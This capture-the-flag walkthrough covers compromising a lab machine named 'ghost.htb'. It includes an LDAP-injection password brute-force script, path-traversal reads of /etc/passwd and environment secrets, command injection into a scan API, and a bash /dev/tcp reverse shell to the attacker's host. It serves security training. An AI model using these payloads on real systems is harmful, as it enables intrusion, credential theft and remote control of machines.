![image](https://github.com/user-attachments/assets/1fd855c0-6109-4d86-bed5-e4f2341afa8f)

## 1. Recon

### 1.1. Port Scan `nmap`

```console
root@kali:~# nmap -Pn -A 10.10.11.24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-29 20:43 +08
Nmap scan report for 10.10.11.24
Host is up (0.022s latency).
Not shown: 982 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-29 12:35:51Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
443/tcp  open  https?
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RC0+
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-07-28T11:29:35
|_Not valid after:  2054-07-28T11:29:35
| ms-sql-info:
|   10.10.11.24:1433:
|     Version:
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|_    TCP port: 1433
| ms-sql-ntlm-info:
|   10.10.11.24:1433:
|     Target_Name: GHOST
|     NetBIOS_Domain_Name: GHOST
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: ghost.htb
|     DNS_Computer_Name: DC01.ghost.htb
|     DNS_Tree_Name: ghost.htb
|_    Product_Version: 10.0.20348
|_ssl-date: 2024-07-29T12:37:17+00:00; -8m27s from scanner time.
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Not valid before: 2024-06-16T15:49:55
|_Not valid after:  2024-12-16T15:49:55
|_ssl-date: 2024-07-29T12:37:17+00:00; -8m27s from scanner time.
8008/tcp open  http          nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Ghost
| http-robots.txt: 5 disallowed entries
|_/ghost/ /p/ /email/ /r/ /webmentions/receive/
|_http-generator: Ghost 5.78
8443/tcp open  ssl/http      nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=core.ghost.htb
| Subject Alternative Name: DNS:core.ghost.htb
| Not valid before: 2024-06-18T15:14:02
|_Not valid after:  2124-05-25T15:14:02
| tls-nextprotoneg:
|_  http/1.1
| http-title: Ghost Core
|_Requested resource was /login
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-alpn:
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (89%)
Aggressive OS guesses: Microsoft Windows Server 2022 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time:
|   date: 2024-07-29T12:36:40
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: -8m26s, deviation: 0s, median: -8m27s

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   5.97 ms   10.10.14.1
2   107.33 ms 10.10.11.24

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.82 seconds
```

## 2. Exploring

### 2.1. `443`

`443` appears to be exposed, but not accessible

![image](https://github.com/user-attachments/assets/696572d4-18ec-4639-a8d7-14d225ce30b8)

```console
root@kali:~# curl -v https://ghost.htb
* Host ghost.htb:443 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.24
*   Trying 10.10.11.24:443...
* Connected to ghost.htb (10.10.11.24) port 443
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
*  CAfile: /etc/ssl/certs/ca-certificates.crt
*  CApath: /etc/ssl/certs
* Recv failure: Connection reset by peer
* OpenSSL SSL_connect: Connection reset by peer in connection to ghost.htb:443
* Closing connection
curl: (35) Recv failure: Connection reset by peer
```

### 2.2. `8443`

`https://core.ghost.htb:8443/login`:

![image](https://github.com/user-attachments/assets/56541c72-13ef-4817-a799-b039cd843152)

`https://federation.ghost.htb/`:

![image](https://github.com/user-attachments/assets/12742a21-67fe-4694-a40b-b5a4fa13ed94)

### 2.3. `8008`

Root page appears to be some kind of blog:

![image](https://github.com/user-attachments/assets/c944ad2d-ecdd-4de9-b11a-7502c77860e3)

Viewing the page source reveals some kind of id:

`<script src="/assets/built/source.js?v=718615e1f1"></script>`

![image](https://github.com/user-attachments/assets/50cd2b41-3f4d-4062-b293-ef38bd465c14)

`http-robots.txt` above found 5 disallowed entries, only `/ghost/` has a page, which is the ghost CMS login:

![image](https://github.com/user-attachments/assets/6dd4c0b5-a6ae-4a30-ac13-d99c9b151b1e)

## 3. Web enumeration

### 3.1. Enumerate for pages

```console
root@kali:~# gobuster dir -u http://ghost.htb:8008 -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://ghost.htb:8008
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

Error: the server returns a status code that matches the provided options for non existing urls. http://ghost.htb:8008/dc05f551-9796-48d8-8ce4-b33ba6c4999c => 301 (Length: 0). To continue please exclude the status code or the length
```


```console
root@kali:~# gobuster dir -u http://ghost.htb:8008 -b 301,404 -f -t 100 -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://ghost.htb:8008
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   301,404
[+] User Agent:              gobuster/3.6
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/favicon.ico/         (Status: 200) [Size: 15406]
/private/             (Status: 302) [Size: 39] [--> http://ghost.htb/]
/rss/                 (Status: 200) [Size: 4041]
/sitemap.xml/         (Status: 200) [Size: 507]
/unsubscribe/         (Status: 400) [Size: 24]
===============================================================
Finished
===============================================================
```

|   |   |
|---|---|
|`-b`|Negative status codes (will override status-codes if set). Can also handle ranges like 200,300-400,404. (default "404")|
|`-f`|Append `/` to each request|
|`-t`|Number of concurrent threads (default 10)|

### 3.2. Enumerate for domains

The root page is already seen, let's get the response size for the root page so that it can be filtered away from the fuzzing result

```console
root@kali:~# curl -I http://ghost.htb:8008/
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 20 Aug 2024 04:21:51 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 7676
Connection: keep-alive
X-Powered-By: Express
Cache-Control: public, max-age=0
ETag: W/"1dfc-Oi6Iz2/cGnJC0hpGTApYlnfl5gY"
Vary: Accept-Encoding
```

```console
root@kali:~# ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -u "http://ghost.htb:8008" -H "HOST:FUZZ.ghost.htb" -c -fs 7676

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://ghost.htb:8008
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.ghost.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 7676
________________________________________________

gitea                   [Status: 200, Size: 13655, Words: 1050, Lines: 272, Duration: 239ms]
intranet                [Status: 307, Size: 3968, Words: 52, Lines: 1, Duration: 712ms]
:: Progress: [151265/151265] :: Job [1/1] :: 18 req/sec :: Duration: [1:23:25] :: Errors: 47 ::
```

#### 3.2.1. Gitea

Nothing much here:

![image](https://github.com/user-attachments/assets/cbcec9e3-fb09-4d87-962f-a678bd4167b3)

![image](https://github.com/user-attachments/assets/444cbc2a-8b2d-4635-a19f-d7db54af7862)

2 users found, but no other information:

![image](https://github.com/user-attachments/assets/5947dd59-d54d-4303-95c1-49edb124de4a)

#### 3.2.2. Intranet

![image](https://github.com/user-attachments/assets/79f3c49d-ce45-4d07-9361-0b3521e5699f)

## 4. Initial access

### 4.1. Attempt login to intranet

![image](https://github.com/user-attachments/assets/d4b6b330-8298-4d70-aa15-327545ca7235)

Analyze the form action with Burpsuite or just simply browser developer tools reveal that it submits a `POST` request with `multipart/form-data` content type:

![image](https://github.com/user-attachments/assets/015dca4f-2abf-46e8-9ecb-ed26c420a638)

The submitted username and secret is submitted as `1_ldap-username` and `1_ldap-secret` keys, which suggests that LDAP authentication is used:

![image](https://github.com/user-attachments/assets/86145e93-02c3-49e2-a9ef-c17f37e72fdc)

> [!Tip]
>
> Browser developer tools provides a `view parsed` function that makes looking at form data easier:
> 
> ![image](https://github.com/user-attachments/assets/4d0318b4-465a-4565-a5c2-b079d26109a4)

Test for LDAP injection by using `*` for both username and secret:

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md

![image](https://github.com/user-attachments/assets/3db318f7-e0b2-40f1-814a-65b47ab1bf52)

Based on the post on `Git Migration`, the `gitea_temp_principal` appears to be quite important, this may be a way in

### 4.2.. Guessing password for `gitea_temp_principal`

#### 4.2.1. Option 1: Burp Suite

![image](https://github.com/user-attachments/assets/1092392d-13e4-4996-b159-3945e017720c)

![image](https://github.com/user-attachments/assets/e4b221c6-b39b-4fbc-bcfa-2bc03a6eea4d)

![image](https://github.com/user-attachments/assets/5b7bbc36-6f19-4e95-a078-c740d9664112)

![image](https://github.com/user-attachments/assets/967202ae-85a5-490b-9f4f-6ef6c9f9000d)

![image](https://github.com/user-attachments/assets/a2413aa3-e743-44be-92b6-913a23cea376)

![image](https://github.com/user-attachments/assets/9a360cb5-76e3-48df-a59b-ab7ede2335a6)

![image](https://github.com/user-attachments/assets/a2c5561d-face-4dad-a9c4-fe32ee644faa)

#### 4.2.2. Option 2: Python script

> [!Tip]
>
> Brute force using Burp Suite is nearly impossible because of the free edition rate throttle
>
> Using the Python script method would make more sense
>
> The script took only 9 seconds to complete

```py
import string
import requests

url = 'http://intranet.ghost.htb:8008/login'

headers = {
    'Host': 'intranet.ghost.htb:8008',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Next-Action': 'c471eb076ccac91d6f828b671795550fd5925940',
    'Connection': 'keep-alive'
}

files = {
    '1_ldap-username': (None, 'gitea_temp_principal'),
    '1_ldap-secret': (None, 's*'),
    '0': (None, '[{},"$K1"]')
}


passw = ""
while True:
    for char in string.ascii_lowercase + string.digits:
        files = {
            '1_ldap-username': (None, 'gitea_temp_principal'),
            '1_ldap-secret': (None, f'{passw}{char}*'),
            '0': (None, '[{},"$K1"]')
        }
        res = requests.post(url, headers=headers, files=files)
        if res.status_code == 303:
            passw += char
            print(f"Passwd: {passw}")
            break
    else:
        break
print(passw)
```

```console
root@kali:~# python3 brute.py
Passwd: s
Passwd: sz
Passwd: szr
Passwd: szrr
Passwd: szrr8
Passwd: szrr8k
Passwd: szrr8kp
Passwd: szrr8kpc
Passwd: szrr8kpc3
Passwd: szrr8kpc3z
Passwd: szrr8kpc3z6
Passwd: szrr8kpc3z6o
Passwd: szrr8kpc3z6on
Passwd: szrr8kpc3z6onl
Passwd: szrr8kpc3z6onlq
Passwd: szrr8kpc3z6onlqf
szrr8kpc3z6onlqf
```

## 5. Exploring Gitea with discovered credentials

Sign in to Gitea with `gitea_temp_principal`:`szrr8kpc3z6onlqf`:

![image](https://github.com/user-attachments/assets/85ac0ad4-2543-4c93-b1e4-0a22b2a2a321)

The `README` for `blog` repository reveals important clues

![image](https://github.com/user-attachments/assets/df3e7953-a711-4f53-8b1e-a5a38a17cfb3)

- The blog uses Ghost CMS, which is running in a Docker container
- The blog integrates with intranet via an API key named `DEV_INTRANET_KEY`, stored as an environment variable
- The public API key for Ghost is: `a5af628828958c976a3b6cc81a`
- The `posts-public.js` for Ghost CMS is modified

### 5.1. Exploiting LFI for the modified Ghost CMS file

Analyzing `posts-public.js` reveals a possibility for LFI via the query parameter `extra`:

```js
        async query(frame) {
            const options = {
                ...frame.options,
                mongoTransformer: rejectPrivateFieldsTransformer
            };
            const posts = await postsService.browsePosts(options);
            const extra = frame.original.query?.extra;
            if (extra) {
                const fs = require("fs");
                if (fs.existsSync(extra)) {
                    const fileContent = fs.readFileSync("/var/lib/ghost/extra/" + extra, { encoding: "utf8" });
                    posts.meta.extra = { [extra]: fileContent };
                }
            }
            return posts;
        }
```

The path for `fs.readFileSync` function is not sanitized, which means it may be possible for LFI using travesal `../` method

Googling for Ghost API key documentation (https://ghost.org/docs/content-api/):
- API URL is at: `https://{admin_domain}/ghost/api/content/`
- Content API keys are provided via a query parameter in the URL `?key={key}`

Attempt to read `/etc/passwd` with the Ghost API:

```sh
curl -s "http://ghost.htb:8008/ghost/api/content/posts/?extra=../../../../etc/passwd&key=a5af628828958c976a3b6cc81a" | jq
```

The file data is in `"extra"`:

```json
{
  "posts": [
    {
      "id": "65bdd2dc26db7d00010704b5",
      "uuid": "22db47b3-bbf6-426d-9fcf-887363df82cf",
      "title": "Embarking on the Supernatural Journey: Welcome to Ghost!",
      "slug": "embarking-on-the-supernatural-journey-welcome-to-ghost",
      ⋮
        <truncated>
      ⋮
    }
  ],
  "meta": {
    "extra": {
      "../../../../etc/passwd": "root:x:0:0:root:/root:/bin/ash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nman:x:13:15:man:/usr/man:/sbin/nologin\npostmaster:x:14:12:postmaster:/var/mail:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\nat:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\nsquid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\nxfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\ncyrus:x:85:12::/usr/cyrus:/sbin/nologin\nvpopmail:x:89:89::/var/vpopmail:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nsmmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nnode:x:1000:1000:Linux User,,,:/home/node:/bin/sh\n"
    }
  }
}
```

> [!Note]
>
> `/etc/passwd` exists even though the target is a Windows machine suggests that Ghost CMS is running in a Linux container

Recall that the blog integrates with intranet via an API key named `DEV_INTRANET_KEY`, stored as an environment variable

Let's attempt to retrieve the container environment variables:

```sh
curl -s "http://ghost.htb:8008/ghost/api/content/posts/?extra=../../../../proc/self/environ&key=a5af628828958c976a3b6cc81a" | jq
```

```json
{
  "posts": [
    {
      "id": "65bdd2dc26db7d00010704b5",
      "uuid": "22db47b3-bbf6-426d-9fcf-887363df82cf",
      "title": "Embarking on the Supernatural Journey: Welcome to Ghost!",
      "slug": "embarking-on-the-supernatural-journey-welcome-to-ghost",
      ⋮
        <truncated>
      ⋮
    }
  ],
  "meta": {
    "extra": {
      "../../../../proc/self/environ": "HOSTNAME=26ae7990f3dd\u0000database__debug=false\u0000YARN_VERSION=1.22.19\u0000PWD=/var/lib/ghost\u0000NODE_ENV=production\u0000database__connection__filename=content/data/ghost.db\u0000HOME=/home/node\u0000database__client=sqlite3\u0000url=http://ghost.htb\u0000DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe\u0000database__useNullAsDefault=true\u0000GHOST_CONTENT=/var/lib/ghost/content\u0000SHLVL=0\u0000GHOST_CLI_VERSION=1.25.3\u0000GHOST_INSTALL=/var/lib/ghost\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000NODE_VERSION=18.19.0\u0000GHOST_VERSION=5.78.0\u0000"
    }
  }
}
```

`DEV_INTRANET_KEY` = `!@yqr!X2kxmQ.@Xe`

## 6. Revisiting intranet with the discovered API key

### 6.1. Connecting the clues

1. A dev API exists at: `http://intranet.ghost.htb/api-dev`

![image](https://github.com/user-attachments/assets/cff8813e-a515-4df2-9d4b-d08cc333f5b1)

2. The API authentication code is discovered at `intranet/backend/src/api/dev.rs`, and shows that the `DEV_INTRANET_KEY` key should be used with `POST` header parameter `X-DEV-INTRANET-KEY`

![image](https://github.com/user-attachments/assets/cfe42bfc-4166-4a2a-8561-74a030b212a7)

3. Recall that the `README` for `blog` repo mentioned that _connection to the intranet_ would allow _URLs from posts will be scanned by the intranet_, the scanning code is discovered at `intranet/backend/src/api/dev/scan.rs`

![image](https://github.com/user-attachments/assets/57123b1f-3ad4-4fad-908e-674bfdf69bb3)

4. The critical part of the scanning code is where it calls `bash -c` with the URL input without sanitization, this should present a possibility for code execution

```rs
    let result = Command::new("bash")
        .arg("-c")
        .arg(format!("intranet_url_check {}", data.url))
        .output();
```

### 6.2. Getting a reverse shell from Ghost CMS container

Let's test the code execution ability on the `scan` API.

Terminating the command with `;` then adding whatever command behind should work: e.g. `; id`

```sh
curl -s http://intranet.ghost.htb:8008/api-dev/scan -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{"url":"; id"}' | jq
```

Indeed, `id` reveals that the code is executed as `root` of the container

(the `intranet_url_check: command not found` stderr message also confirms that the feature is still in development)

```js
{
  "is_safe": true,
  "temp_command_success": true,
  "temp_command_stdout": "uid=0(root) gid=0(root) groups=0(root)\n",
  "temp_command_stderr": "bash: line 1: intranet_url_check: command not found\n"
}
```

Since the container has `bash`, let's use the bash reverse shell:

```sh
bash -i >& /dev/tcp/<kali-ip>/4444 0>&1
```

Setup a listener:

```sh
rlwrap nc -nlvp 4444
```

Put the reverse shell command into `curl` and using `&` to run it in the background:

```sh
curl -s http://intranet.ghost.htb:8008/api-dev/scan -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{"url":"; bash -i >& /dev/tcp/<kali-ip>/4444 0>&1"}' &
```

Reverse shell hooked:

```console
root@kali:~# rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.24] 49828
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@36b733906694:/app# id
id
uid=0(root) gid=0(root) groups=0(root)
```
